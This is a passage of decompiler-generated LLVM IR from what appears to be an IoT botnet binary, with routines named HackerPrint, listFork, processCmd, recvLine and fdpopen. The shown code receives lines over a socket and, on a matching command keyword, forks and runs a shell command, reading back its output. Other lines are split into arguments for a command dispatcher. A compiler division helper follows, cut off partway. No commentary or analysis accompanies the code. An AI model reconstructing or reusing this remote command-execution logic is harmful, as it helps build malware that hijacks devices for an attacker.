  %v7_1396c = icmp eq i8 %v2_13968, 32
  br i1 %v7_1396c, label %dec_label_pc_13984, label %dec_label_pc_13974

dec_label_pc_13974:                               ; preds = %dec_label_pc_1394c, %dec_label_pc_13958
  %v4_1396427 = phi i32 [ %v1_1395c, %dec_label_pc_13958 ], [ %v1_138cc, %dec_label_pc_1394c ]
  %stack_var_-64.026 = phi i8* [ %v5_13960, %dec_label_pc_13958 ], [ %v5_138d0, %dec_label_pc_1394c ]
  %v2_13978 = load i8, i8* %stack_var_-64.026, align 1
  %v2_1397c = icmp eq i8 %v2_13978, 0
  br i1 %v2_1397c, label %dec_label_pc_13984, label %dec_label_pc_13958

dec_label_pc_13984:                               ; preds = %dec_label_pc_13958, %dec_label_pc_13974, %dec_label_pc_1394c
  %stack_var_-64.0.lcssa = phi i8* [ %v5_138d0, %dec_label_pc_1394c ], [ %v5_13960, %dec_label_pc_13958 ], [ %stack_var_-64.026, %dec_label_pc_13974 ]
  %v4_13964.lcssa = phi i32 [ %v1_138cc, %dec_label_pc_1394c ], [ %v1_1395c, %dec_label_pc_13958 ], [ %v4_1396427, %dec_label_pc_13974 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_13994 = add i32 %v4_13964.lcssa, 1
  %v2_139d832 = load i8, i8* %v5_138d0, align 1
  %v2_139dc34 = icmp eq i8 %v2_139d832, 0
  br i1 %v2_139dc34, label %dec_label_pc_139e4, label %dec_label_pc_139a8

dec_label_pc_139a8:                               ; preds = %dec_label_pc_13984, %dec_label_pc_139a8
  %storemerge736 = phi i8* [ %storemerge7, %dec_label_pc_139a8 ], [ %v5_138d0, %dec_label_pc_13984 ]
  %storemerge1635 = phi i32 [ %v1_139cc, %dec_label_pc_139a8 ], [ %v1_138cc, %dec_label_pc_13984 ]
  %v2_139ac = load i8, i8* %storemerge736, align 1
  %v3_139ac = zext i8 %v2_139ac to i32
  %v1_139b4 = call i32 @__GI_toupper(i32 %v3_139ac)
  %v1_139c4 = trunc i32 %v1_139b4 to i8
  store i8 %v1_139c4, i8* %storemerge736, align 1
  %v1_139cc = add i32 %storemerge1635, 1
  %storemerge7 = inttoptr i32 %v1_139cc to i8*
  %v2_139d8 = load i8, i8* %storemerge7, align 1
  %v2_139dc = icmp eq i8 %v2_139d8, 0
  br i1 %v2_139dc, label %dec_label_pc_139e4, label %dec_label_pc_139a8

dec_label_pc_139e4:                               ; preds = %dec_label_pc_139a8, %dec_label_pc_13984
  store i32 ptrtoint ([5 x i8]* @global_var_229b8.867 to i32), i32* @r1, align 4
  %v4_139f0 = call i32 @__GI_strcoll(i8* %v5_138d0, i32 ptrtoint ([5 x i8]* @global_var_229b8.867 to i32))
  store i32 %v4_139f0, i32* @r0, align 4
  %v2_139f8 = icmp eq i32 %v4_139f0, 0
  br i1 %v2_139f8, label %dec_label_pc_13a00, label %dec_label_pc_13ae4

dec_label_pc_13a00:                               ; preds = %dec_label_pc_139e4
  %v0_13a00 = call i32 @listFork()
  %v2_13a08 = icmp eq i32 %v0_13a00, 0
  br i1 %v2_13a08, label %dec_label_pc_13a10, label %dec_label_pc_13c68

dec_label_pc_13a10:                               ; preds = %dec_label_pc_13a00
  store i32 1024, i32* @r2, align 4
  %v3_13a28 = call i32 @__GI_memset(i8* %v2_13a28, i32 0)
  %v6_13a48 = call i32 @szprintf(i32 %v2_13a18, i32 ptrtoint ([8 x i8]* @global_var_229c0.869 to i32), i32 %v1_13994, i32 %v2_13a18, i32 ptrtoint (i32* @0 to i32))
  %v3_13a64 = call i32 @fdpopen(i32 %v2_13a18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_229c8.871, i32 0, i32 0))
  br label %dec_label_pc_13aac

dec_label_pc_13a74:                               ; preds = %dec_label_pc_13aac
  %v2_13a84 = call i32 @trim(i8* %v2_13a28)
  store i32 1024, i32* @r2, align 4
  %v3_13aa0 = call i32 @__GI_memset(i8* %v2_13a28, i32 0)
  %v1_13aa8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a10, %dec_label_pc_13a74
  %v4_13ac4 = call i32 @fdgets(i32 %v2_13a18, i32 1024, i32 %v3_13a64, i32 %v2_13a18)
  %v2_13acc = icmp eq i32 %v4_13ac4, 0
  br i1 %v2_13acc, label %dec_label_pc_13ad4, label %dec_label_pc_13a74

dec_label_pc_13ad4:                               ; preds = %dec_label_pc_13aac
  %v1_13ad8 = call i32 @fdpclose(i32 %v3_13a64)
  %v1_13ae0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13ae4

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_139e4, %dec_label_pc_13ad4
  %v2_13af8 = call i32 @__GI_strtok(i32 %v1_13994, i32 ptrtoint (i32* @global_var_229cc.873 to i32))
  store i32 %v1_138cc, i32* %stack_var_-132, align 4
  %v2_13bf039 = icmp eq i32 %v2_13af8, 0
  br i1 %v2_13bf039, label %dec_label_pc_13bf8, label %dec_label_pc_13b10

dec_label_pc_13b10:                               ; preds = %dec_label_pc_13ae4, %dec_label_pc_13bd8
  %stack_var_-36.042.in = phi i32 [ %v2_13be0, %dec_label_pc_13bd8 ], [ %v2_13af8, %dec_label_pc_13ae4 ]
  %stack_var_-40.140 = phi i32 [ %stack_var_-40.0, %dec_label_pc_13bd8 ], [ 1, %dec_label_pc_13ae4 ]
  %stack_var_-36.042 = inttoptr i32 %stack_var_-36.042.in to i8*
  %v2_13b14 = load i8, i8* %stack_var_-36.042, align 1
  %v7_13b18 = icmp eq i8 %v2_13b14, 10
  br i1 %v7_13b18, label %dec_label_pc_13bd8, label %dec_label_pc_13b20

dec_label_pc_13b20:                               ; preds = %dec_label_pc_13b10
  store i32 %stack_var_-40.140, i32* @r4, align 4
  %v3_13b2c = call i32 @strlen(i8* nonnull %stack_var_-36.042)
  %v1_13b34 = add i32 %v3_13b2c, 1
  %v1_13b3c = call i32 @malloc(i32 %v1_13b34)
  %v0_13b4c = load i32, i32* @r4, align 4
  %v3_13b4c = mul i32 %v0_13b4c, 4
  %v2_13b58 = add i32 %v2_13c38, %v3_13b4c
  %v2_13b5c = inttoptr i32 %v2_13b58 to i32*
  store i32 %v1_13b3c, i32* %v2_13b5c, align 4
  %v3_13b68 = mul i32 %stack_var_-40.140, 4
  %v2_13b74 = add i32 %v2_13c38, %v3_13b68
  %v1_13b78 = inttoptr i32 %v2_13b74 to i32*
  %v2_13b78 = load i32, i32* %v1_13b78, align 4
  store i32 %v2_13b78, i32* @r4, align 4
  %v3_13b84 = call i32 @strlen(i8* nonnull %stack_var_-36.042)
  %v1_13b8c = add i32 %v3_13b84, 1
  %v0_13b90 = load i32, i32* @r4, align 4
  store i32 %v1_13b8c, i32* @r2, align 4
  %v2_13b9c = inttoptr i32 %v0_13b90 to i8*
  %v3_13b9c = call i32 @__GI_memset(i8* %v2_13b9c, i32 0)
  %v2_13bb8 = load i32, i32* %v1_13b78, align 4
  store i32 %stack_var_-36.042.in, i32* @r1, align 4
  %v3_13bc8 = inttoptr i32 %v2_13bb8 to i8*
  %v4_13bc8 = call i32 @strcpy(i8* %v3_13bc8, i32 %stack_var_-36.042.in)
  %v1_13bd0 = add i32 %stack_var_-40.140, 1
  br label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13b10, %dec_label_pc_13b20
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.140, %dec_label_pc_13b10 ], [ %v1_13bd0, %dec_label_pc_13b20 ]
  %v2_13be0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_229cc.873 to i32))
  %v2_13bf0 = icmp eq i32 %v2_13be0, 0
  br i1 %v2_13bf0, label %dec_label_pc_13bf8, label %dec_label_pc_13b10

dec_label_pc_13bf8:                               ; preds = %dec_label_pc_13bd8, %dec_label_pc_13ae4
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_13ae4 ], [ %stack_var_-40.0, %dec_label_pc_13bd8 ]
  %v3_13c04 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-132)
  %v7_13c10 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_13c10, label %dec_label_pc_13c68, label %dec_label_pc_13c28.lr.ph

dec_label_pc_13c28.lr.ph:                         ; preds = %dec_label_pc_13bf8
  br label %dec_label_pc_13c28

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13c28.lr.ph, %dec_label_pc_13c28
  %storemerge17114 = phi i32 [ 1, %dec_label_pc_13c28.lr.ph ], [ %v1_13c50, %dec_label_pc_13c28 ]
  %v3_13c30 = mul i32 %storemerge17114, 4
  %v2_13c3c = add i32 %v2_13c38, %v3_13c30
  %v1_13c40 = inttoptr i32 %v2_13c3c to i32*
  %v2_13c40 = load i32, i32* %v1_13c40, align 4
  store i32 %v2_13c40, i32* @r0, align 4
  %v0_13c48 = call i32 @free()
  %v1_13c50 = add nuw nsw i32 %storemerge17114, 1
  %v5_13c64 = icmp slt i32 %v1_13c50, %stack_var_-40.1.lcssa
  br i1 %v5_13c64, label %dec_label_pc_13c28, label %dec_label_pc_13c68

dec_label_pc_13c68:                               ; preds = %dec_label_pc_13c28, %dec_label_pc_13a00, %dec_label_pc_1382c, %dec_label_pc_13bf8, %dec_label_pc_13888, %dec_label_pc_137dc, %dec_label_pc_1344c
  %v2_13c6c = load i32, i32* @global_var_2c5e8.50, align 4
  %v5_13c88 = call i32 @recvLine(i32 %v2_13c6c, i8* %v4_13c88, i32 4096, i32 %v2_13c78)
  %v3_13c98 = icmp eq i32 %v5_13c88, -1
  br i1 %v3_13c98, label %dec_label_pc_13430, label %dec_label_pc_13704

; uselistorder directives
  uselistorder i32 %v5_13c88, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_13be0, { 1, 0 }
  uselistorder i8* %stack_var_-36.042, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.140, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_139cc, { 1, 0 }
  uselistorder i8* %storemerge736, { 1, 0 }
  uselistorder i32 %v1_13994, { 1, 0 }
  uselistorder i32 %v1_13900, { 2, 1, 0 }
  uselistorder i8* %v5_138d0, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_138cc, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_13740, { 1, 0 }
  uselistorder i32 %v3_1370c, { 1, 0 }
  uselistorder i32 %storemerge14, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_1362c, { 1, 0 }
  uselistorder i32 %v1_13610, { 1, 0 }
  uselistorder i32 %v1_134e4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_13500, { 1, 0 }
  uselistorder i32 %v2_134f4, { 1, 0 }
  uselistorder i32 %v2_13c38, { 2, 0, 1 }
  uselistorder i32 %v2_13a18, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_13c88, { 3, 0, 1, 2 }
  uselistorder i32 %v2_13c78, { 7, 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 %v2_133d0, { 1, 0 }
  uselistorder i32 %v0_133b8, { 1, 0, 2, 3 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2c5f0.56, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_32850.59, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 11, 9, 10 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 4, 3, 2, 1, 5, 17, 16, 0 }
  uselistorder i32* @global_var_2c5e8.50, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 0, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 23, 24, 25, 26, 27, 15, 16, 17, 18, 19, 20, 0, 1, 2, 3, 4, 5, 6, 21, 22 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_32844.478, { 1, 2, 0, 5, 3, 4 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @access, { 1, 0 }
  uselistorder label %dec_label_pc_13c68, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_13c28, { 1, 0 }
  uselistorder label %dec_label_pc_13bd8, { 1, 0 }
  uselistorder label %dec_label_pc_13b10, { 1, 0 }
  uselistorder label %dec_label_pc_13ae4, { 1, 0 }
  uselistorder label %dec_label_pc_13aac, { 1, 0 }
  uselistorder label %dec_label_pc_139a8, { 1, 0 }
  uselistorder label %dec_label_pc_13984, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13974, { 1, 0 }
  uselistorder label %dec_label_pc_138fc, { 1, 0 }
  uselistorder label %dec_label_pc_13868, { 1, 0 }
  uselistorder label %dec_label_pc_1382c, { 1, 0 }
  uselistorder label %dec_label_pc_13778, { 1, 0 }
  uselistorder label %dec_label_pc_136f8, { 1, 0 }
  uselistorder label %dec_label_pc_13668, { 1, 0 }
  uselistorder label %dec_label_pc_13628, { 1, 0 }
  uselistorder label %dec_label_pc_13534, { 1, 0 }
  uselistorder label %dec_label_pc_134f0, { 1, 0 }
  uselistorder label %dec_label_pc_13430, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13418, { 2, 1, 0 }
  uselistorder label %dec_label_pc_132b4, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13cf4 = load i32, i32* @r1, align 4
  %v1_13cf4 = add i32 %v0_13cf4, -1
  store i32 %v1_13cf4, i32* %r2.global-to-local, align 4
  %v2_13cf4 = icmp eq i32 %v0_13cf4, 0
  %v7_13cf4 = icmp eq i32 %v0_13cf4, 1
  %v0_13cf8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_13cf4, i32 %v0_13cf8)
  br i1 %v2_13cf4, label %dec_label_pc_13ddc, label %dec_label_pc_13d00

dec_label_pc_13d00:                               ; preds = %entry
  %v0_13d00 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d00 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_13d00, %v1_13d00
  br i1 %tmp, label %dec_label_pc_13d08, label %dec_label_pc_13d94

dec_label_pc_13d08:                               ; preds = %dec_label_pc_13d00
  %v1_13d08 = load i32, i32* %r2.global-to-local, align 4
  %v2_13d08 = and i32 %v1_13d08, %v1_13d00
  %v4_13d08 = icmp eq i32 %v2_13d08, 0
  br i1 %v4_13d08, label %dec_label_pc_13da0, label %dec_label_pc_13d10

dec_label_pc_13d10:                               ; preds = %dec_label_pc_13d08
  %v3_13d10 = icmp ult i32 %v1_13d00, 536870912
  br i1 %v3_13d10, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_13d10
  %v4_13d14 = mul i32 %v1_13d00, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_13d10, %.thread
  %v0_13d34.pr36.ph = phi i32 [ %v4_13d14, %.thread ], [ %v1_13d00, %dec_label_pc_13d10 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_13d10 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_13d34.pr36 = phi i32 [ %v4_13d28, %bb81 ], [ %v0_13d34.pr36.ph, %.preheader.preheader ]
  %v1_13d2c = phi i32 [ %v4_13d2c, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_13d20 = icmp ugt i32 %v0_13d34.pr36, 268435455
  br i1 %v2_13d20, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13d34thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_13d24 = icmp ult i32 %v0_13d34.pr36, %v0_13d00
  br i1 %v4_13d24, label %bb80, label %dec_label_pc_13d34thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_13d28 = and i32 %v0_13d34.pr36, 268435456
  %v3_13d28 = icmp eq i32 %v2_13d28, 0
  %v4_13d28 = mul i32 %v0_13d34.pr36, 16
  br i1 %v3_13d28, label %bb81, label %dec_label_pc_13d34.loopexit

bb81:                                             ; preds = %bb80
  %v2_13d2c = and i32 %v1_13d2c, 268435456
  %v3_13d2c = icmp eq i32 %v2_13d2c, 0
  %v4_13d2c = mul i32 %v1_13d2c, 16
  br i1 %v3_13d2c, label %.preheader, label %dec_label_pc_13d34thread-pre-split.loopexit.loopexit

dec_label_pc_13d34thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_13d4048.ph = phi i32 [ %v1_13d2c, %bb ], [ %v4_13d2c, %bb81 ]
  %v0_13d34.pr38.ph = phi i32 [ %v0_13d34.pr36, %bb ], [ %v4_13d28, %bb81 ]
  br label %dec_label_pc_13d34thread-pre-split.loopexit

dec_label_pc_13d34thread-pre-split.loopexit:      ; preds = %dec_label_pc_13d34thread-pre-split.loopexit.loopexit, %.thread2
  %v1_13d4048 = phi i32 [ %v1_13d2c, %.thread2 ], [ %v1_13d4048.ph, %dec_label_pc_13d34thread-pre-split.loopexit.loopexit ]
  %v0_13d34.pr38 = phi i32 [ %v0_13d34.pr36, %.thread2 ], [ %v0_13d34.pr38.ph, %dec_label_pc_13d34thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13d34thread-pre-split

dec_label_pc_13d34thread-pre-split:               ; preds = %dec_label_pc_13d34thread-pre-split.loopexit, %bb83
  %v1_13d4046 = phi i32 [ %v1_13d4048, %dec_label_pc_13d34thread-pre-split.loopexit ], [ %v3_13d40, %bb83 ]
  %v0_13d34.pr = phi i32 [ %v0_13d34.pr38, %dec_label_pc_13d34thread-pre-split.loopexit ], [ %v3_13d3c, %bb83 ]
  br label %dec_label_pc_13d34

dec_label_pc_13d34.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_13d34

dec_label_pc_13d34:                               ; preds = %dec_label_pc_13d34.loopexit, %dec_label_pc_13d34thread-pre-split
  %v1_13d40 = phi i32 [ %v1_13d4046, %dec_label_pc_13d34thread-pre-split ], [ %v1_13d2c, %dec_label_pc_13d34.loopexit ]
  %v1_13d3c = phi i32 [ %v0_13d34.pr, %dec_label_pc_13d34thread-pre-split ], [ %v4_13d28, %dec_label_pc_13d34.loopexit ]
  %v2_13d34 = icmp slt i32 %v1_13d3c, 0
  br i1 %v2_13d34, label %dec_label_pc_13d48, label %bb82

bb82:                                             ; preds = %dec_label_pc_13d34
  %v4_13d38 = icmp ult i32 %v1_13d3c, %v0_13d00
  br i1 %v4_13d38, label %bb83, label %dec_label_pc_13d48

bb83:                                             ; preds = %bb82
  %v3_13d3c = mul i32 %v1_13d3c, 2
  %v2_13d40 = icmp slt i32 %v1_13d40, 0
  %v3_13d40 = mul i32 %v1_13d40, 2
  br i1 %v2_13d40, label %dec_label_pc_13d48, label %dec_label_pc_13d34thread-pre-split

dec_label_pc_13d48:                               ; preds = %bb82, %dec_label_pc_13d34, %bb83
  %v2_13d5459 = phi i32 [ %v3_13d40, %bb83 ], [ %v1_13d40, %bb82 ], [ %v1_13d40, %dec_label_pc_13d34 ]
  %v1_13d4c51 = phi i32 [ %v3_13d3c, %bb83 ], [ %v1_13d3c, %bb82 ], [ %v1_13d3c, %dec_label_pc_13d34 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d4c

dec_label_pc_13d4c:                               ; preds = %.thread11, %dec_label_pc_13d48
  %v1_13d80 = phi i32 [ %v4_13d80, %.thread11 ], [ %v2_13d5459, %dec_label_pc_13d48 ]
  %v1_13d54 = phi i32 [ %v0_13d8c, %.thread11 ], [ 0, %dec_label_pc_13d48 ]
  %v1_13d84 = phi i32 [ %v4_13d84, %.thread11 ], [ %v1_13d4c51, %dec_label_pc_13d48 ]
  %v1_13d50 = phi i32 [ %v0_13d7c, %.thread11 ], [ %v0_13d00, %dec_label_pc_13d48 ]
  %v3_13d4c = icmp ult i32 %v1_13d50, %v1_13d84
  br i1 %v3_13d4c, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_13d4c
  %v3_13d50 = sub i32 %v1_13d50, %v1_13d84
  store i32 %v3_13d50, i32* %r0.global-to-local, align 4
  %v3_13d54 = or i32 %v1_13d54, %v1_13d80
  store i32 %v3_13d54, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13d4c, %bb84
  %v1_13d5c = phi i32 [ %v1_13d50, %dec_label_pc_13d4c ], [ %v3_13d50, %bb84 ]
  %v1_13d60 = phi i32 [ %v1_13d54, %dec_label_pc_13d4c ], [ %v3_13d54, %bb84 ]
  %v4_13d58 = udiv i32 %v1_13d84, 2
  %v6_13d58 = icmp ult i32 %v1_13d5c, %v4_13d58
  br i1 %v6_13d58, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_13d5c = urem i32 %v1_13d84, 2
  %v4_13d5c = icmp eq i32 %v3_13d5c, 0
  %v6_13d5c = sub i32 %v1_13d5c, %v4_13d58
  store i32 %v6_13d5c, i32* %r0.global-to-local, align 4
  br i1 %v4_13d5c, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_13d60 = udiv i32 %v1_13d80, 2
  %v6_13d60 = or i32 %v1_13d60, %v5_13d60
  store i32 %v6_13d60, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_13d68 = phi i32 [ %v6_13d5c, %bb85 ], [ %v1_13d5c, %.thread7 ], [ %v6_13d5c, %bb86 ]
  %v1_13d6c = phi i32 [ %v1_13d60, %bb85 ], [ %v1_13d60, %.thread7 ], [ %v6_13d60, %bb86 ]
  %v4_13d64 = udiv i32 %v1_13d84, 4
  %v6_13d64 = icmp ult i32 %v1_13d68, %v4_13d64
  br i1 %v6_13d64, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_13d68 = and i32 %v1_13d84, 2
  %v4_13d68 = icmp eq i32 %v3_13d68, 0
  %v6_13d68 = sub i32 %v1_13d68, %v4_13d64
  store i32 %v6_13d68, i32* %r0.global-to-local, align 4
  br i1 %v4_13d68, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_13d6c = udiv i32 %v1_13d80, 4
  %v6_13d6c = or i32 %v1_13d6c, %v5_13d6c
  store i32 %v6_13d6c, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_13d74 = phi i32 [ %v6_13d68, %bb87 ], [ %v1_13d68, %.thread8 ], [ %v6_13d68, %bb88 ]
  %v1_13d78 = phi i32 [ %v1_13d6c, %bb87 ], [ %v1_13d6c, %.thread8 ], [ %v6_13d6c, %bb88 ]
  %v4_13d70 = udiv i32 %v1_13d84, 8
  %v6_13d70 = icmp ult i32 %v1_13d74, %v4_13d70
  br i1 %v6_13d70, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_13d74 = and i32 %v1_13d84, 4
  %v4_13d74 = icmp eq i32 %v3_13d74, 0
  %v6_13d74 = sub i32 %v1_13d74, %v4_13d70
  store i32 %v6_13d74, i32* %r0.global-to-local, align 4
  br i1 %v4_13d74, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_13d78 = udiv i32 %v1_13d80, 8
  %v6_13d78 = or i32 %v1_13d78, %v5_13d78
  store i32 %v6_13d78, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_13d8c = phi i32 [ %v1_13d78, %bb89 ], [ %v1_13d78, %.thread9 ], [ %v6_13d78, %bb90 ]
  %v0_13d7c = phi i32 [ %v6_13d74, %bb89 ], [ %v1_13d74, %.thread9 ], [ %v6_13d74, %bb90 ]
  %v2_13d7c = icmp eq i32 %v0_13d7c, 0
  br i1 %v2_13d7c, label %dec_label_pc_13d8c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_13d80, 16
  br i1 %tmp138, label %dec_label_pc_13d8c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_13d80 = udiv i32 %v1_13d80, 16
  %v4_13d84 = udiv i32 %v1_13d84, 16
  br label %dec_label_pc_13d4c

dec_label_pc_13d8c:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_13d8c, i32* %r0.global-to-local, align 4
  ret i32 %v0_13d8c

dec_label_pc_13d94:                               ; preds = %dec_label_pc_13d00
  %v9_13d00 = icmp eq i32 %v0_13d00, %v1_13d00
  %. = zext i1 %v9_13d00 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d08
  %v2_13da0 = icmp ugt i32 %v1_13d00, 65535
  br i1 %v2_13da0, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_13da0
  %v2_13da4 = and i32 %v1_13d00, 32768
  %v3_13da4 = icmp eq i32 %v2_13da4, 0
  %v4_13da4 = udiv i32 %v1_13d00, 65536
  br i1 %v3_13da4, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_13da0
  %v0_13db065 = phi i32 [ %v1_13d00, %dec_label_pc_13da0 ], [ %v4_13da4, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_13db4 = phi i32 [ %v0_13db065, %.thread16 ], [ %v4_13da4, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_13db0 = icmp ugt i32 %v1_13db4, 255
  br i1 %v2_13db0, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_13db4 = and i32 %v1_13db4, 128
  %v3_13db4 = icmp eq i32 %v2_13db4, 0
  %v4_13db4 = udiv i32 %v1_13db4, 256
  br i1 %v3_13db4, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_13db8 = or i32 %storemerge, 8
  store i32 %v2_13db8, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_13dc4 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_13db8, %bb98 ]
  %v1_13dc0 = phi i32 [ %v1_13db4, %bb96 ], [ %v4_13db4, %bb97 ], [ %v4_13db4, %bb98 ]
  %v2_13dbc = icmp ugt i32 %v1_13dc0, 15
  br i1 %v2_13dbc, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_13dc0 = and i32 %v1_13dc0, 8
  %v3_13dc0 = icmp eq i32 %v2_13dc0, 0
  %v4_13dc0 = udiv i32 %v1_13dc0, 16
  br i1 %v3_13dc0, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_13dc4 = add nsw i32 %v1_13dc4, 4
